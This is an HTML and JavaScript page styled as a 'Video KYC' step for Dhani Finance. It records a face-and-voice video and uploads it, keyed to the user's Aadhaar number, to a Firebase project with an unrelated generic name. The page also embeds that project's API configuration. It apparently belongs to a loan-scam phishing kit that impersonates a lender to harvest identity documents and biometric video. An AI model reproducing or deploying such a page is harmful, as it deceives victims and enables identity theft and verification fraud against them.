<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video KYC â€“ Dhani Finance</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif;}
body{background:#f4f6fb;color:#111827;min-height:100vh;padding:12px;}
.container{max-width:480px;margin:auto;width:100%;padding-bottom:30px;}
.header-card{background:#fff;border-radius:16px;padding:20px;margin-bottom:20px;box-shadow:0 4px 12px rgba(0,0,0,0.08);text-align:center;}
.header-card h2{font-size:20px;margin-bottom:6px;}
.header-card p{font-size:14px;color:#6b7280;}
.video-card{background:#fff;border-radius:16px;padding:16px;margin-bottom:16px;box-shadow:0 4px 12px rgba(0,0,0,0.08);text-align:center;position:relative;}
video{width:100%;border-radius:12px;margin-bottom:12px;}
button{width:100%;padding:14px;background: linear-gradient(135deg,#2563eb,#3b82f6);border:none;border-radius:12px;color:#fff;font-weight:600;font-size:16px;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,0.15);transition: transform .2s, box-shadow .2s;margin-bottom:12px;}
button:hover{transform:scale(1.05);box-shadow:0 6px 18px rgba(0,0,0,0.2);}
#status{text-align:center;margin-top:12px;font-size:14px;color:#2563eb;}
.progress-bar-container{width:100%;height:8px;background:#e5e7eb;border-radius:6px;margin-bottom:12px;overflow:hidden;display:none;}
.progress-bar{height:100%;width:0%;background: linear-gradient(270deg,#2563eb,#3b82f6,#2563eb);background-size: 600% 100%;border-radius:6px;transition: width 0.1s linear;animation: gradientFlow 3s ease infinite;}
@keyframes gradientFlow {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
.countdown{position:absolute;top:12px;right:12px;background:rgba(0,0,0,0.6);color:#fff;padding:6px 10px;border-radius:8px;font-size:16px;font-weight:600;display:none;}
@media(max-width:480px){video{height:auto;}}
</style>
</head>
<body>

<div class="notice">
  Enable notifications to get loan updates
</div>

<!-- rest of your dashboard HTML -->


<div class="container">
  <div class="header-card">
    <h2>Video KYC</h2>
    <p>Record a short video (max 30 sec) for identity verification</p>
  </div>

  <div class="video-card">
    <video id="videoPreview" autoplay muted playsinline></video>
    <video id="recordedVideo" controls style="display:none;" playsinline></video>
    <div class="progress-bar-container">
      <div class="progress-bar" id="recordProgress"></div>
    </div>
    <div class="countdown" id="countdownTimer">30</div>
    <button id="startBtn">Start Recording</button>
    <button id="stopBtn" style="display:none;">Stop Recording</button>
    <button id="uploadBtn" style="display:none;">Upload Video</button>
    <div id="status"></div>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-storage-compat.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyCsIYVX3OawpDlFZpKU3KpRsfM7QQoyWyY",
    authDomain: "onlineservice-9f153.firebaseapp.com",
    databaseURL: "https://onlineservice-9f153-default-rtdb.firebaseio.com",
    projectId: "onlineservice-9f153",
    storageBucket: "onlineservice-9f153.appspot.com",
    messagingSenderId: "1040271430967",
    appId: "1:1040271430967:web:6325b056257454943d36b2"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();
  
const storage = firebase.storage();

const videoPreview = document.getElementById('videoPreview');
const recordedVideo = document.getElementById('recordedVideo');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const uploadBtn = document.getElementById('uploadBtn');
const statusElem = document.getElementById('status');
const progressBar = document.getElementById('recordProgress');
const progressContainer = progressBar.parentElement;
const countdownElem = document.getElementById('countdownTimer');

let mediaRecorder, recordedChunks = [], recordInterval, seconds=0, maxSeconds=30;

// Mobile compatible camera init
async function initCamera(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, // front camera
      audio: true
    });
    videoPreview.srcObject = stream;
    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
    mediaRecorder.onstop = () => {
      const blob = new Blob(recordedChunks, {type:'video/webm'});
      recordedVideo.src = URL.createObjectURL(blob);
      recordedVideo.style.display='block';
      videoPreview.style.display='none';
      uploadBtn.style.display='block';
      progressContainer.style.display='none';
      countdownElem.style.display='none';
      clearInterval(recordInterval);
      seconds=0;
      progressBar.style.width='0%';
      countdownElem.innerText = maxSeconds;
    };
  }catch(err){
    console.error(err);
    alert("Cannot access camera. Please allow camera and microphone.");
  }
}

startBtn.onclick = () => {
  recordedChunks = [];
  mediaRecorder.start();
  statusElem.innerText="Recording...";
  startBtn.style.display='none';
  stopBtn.style.display='block';
  progressContainer.style.display='block';
  countdownElem.style.display='block';
  seconds=0;
  countdownElem.innerText = maxSeconds;

  recordInterval = setInterval(()=>{
    seconds++;
    const percent = (seconds/maxSeconds)*100;
    progressBar.style.width = percent+'%';
    countdownElem.innerText = maxSeconds - seconds;
    if(seconds>=maxSeconds){
      mediaRecorder.stop();
      statusElem.innerText="Recording stopped (max 30 sec).";
      stopBtn.style.display='none';
    }
  },1000);
};

stopBtn.onclick = () => {
  mediaRecorder.stop();
  statusElem.innerText="Recording stopped.";
  stopBtn.style.display='none';
};

uploadBtn.onclick = async () => {
  if(recordedChunks.length===0) return alert("No video recorded.");
  const aadhaar = localStorage.getItem("loan_aadhaar");
  if(!aadhaar){ alert("User not logged in."); window.location.href="index.html"; return; }

  const blob = new Blob(recordedChunks, {type:'video/webm'});
  const ref = storage.ref(`kyc/${aadhaar}/videoKYC.webm`);
  statusElem.innerText="Uploading video...";
  try{
    await ref.put(blob);
    const videoURL = await ref.getDownloadURL();
    await db.ref(`loanUsers/${aadhaar}/kyc/videoKYC`).set({
      url: videoURL,
      submittedAt: Date.now(),
      verified:false
    });
    statusElem.innerText="Video KYC uploaded successfully!";
    alert("Video KYC uploaded successfully!");
    window.location.href="dashboard.html";
  }catch(err){
    console.error(err);
    statusElem.innerText="Error uploading video.";
    alert("Error uploading video.");
  }
};

initCamera();
</script>
</body>
</html>
